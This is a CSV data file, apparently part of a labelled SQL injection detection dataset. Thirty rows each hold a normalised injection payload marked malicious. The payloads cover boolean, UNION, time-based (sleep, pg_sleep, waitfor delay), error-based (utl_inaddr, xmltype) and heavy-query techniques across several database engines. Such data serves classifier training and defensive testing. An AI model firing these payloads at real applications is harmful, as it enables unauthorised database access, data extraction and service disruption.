row_index,payload_norm,label,sqli_type_hint
4950,"1' in boolean mode ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) #",1,
4951,select ( case when ( 3672 = 8360 ) then 3672 else 3672* ( select 3672 from information_schema.character_sets ) end ) #,1,
4952,"1 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) # jmki",1,
4953,1 where 1092 = 1092,1,
4954,1' ) where 9538 = 9538,1,
4955,"1' ) where 9006 = 9006 union all select null,null,null,null,null,null--",1,
4956,"-6854"" where 7794 = 7794 union all select 7794,7794--",1,
4957,1'|| ( select 'mosp' where 6085 = 6085,1,
4958,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'wdeu' like 'wdeu",1,
4959,-6215' ) or ( 8459 = 8459 ) *4906,1,
4960,"-8136' ) union all select 1324,1324,1324,1324#",1,
4961,1 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) -- jdia,1,
4962,-5336' ) where 8691 = 8691 or 3608 = 1887--,1,
4963,"1%"" ) ) union all select null,null,null,null,null#",1,
4964,1' ) ) ) and ( 5995 = 9618 ) *9618 and ( ( ( 'nagr' like 'nagr,1,
4965,1'|| ( select 'homm' where 4937 = 4937 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
4966,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( 9646 = 9646",1,
4967,-8095' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),1,
4968,1 ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 6824 = 6824,1,
4969,"1' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'ekla' = 'ekla",1,
4970,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'zspf' = 'zspf",1,
4971,"-2222' in boolean mode ) union all select 7649,7649,7649,7649,7649,7649,7649,7649--",1,
4972,"-3525"" where 3522 = 3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",1,
4973,"1' ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
4974,-7746' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'itxy' like 'itxy,1,
4975,"1 ) ) as nnpe where 9720 = 9720 union all select null,null,null,null,null,null,null,null,null#",1,
4976,1 where 6523 = 6523 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
4977,select case when 2930 = 7964 then 1 else null end--,1,
4978,"1"" where 7631 = 7631 and 4733 = 3439",1,
4979,1 ) as crsd where 5271 = 5271 waitfor delay '0:0:5'--,1,
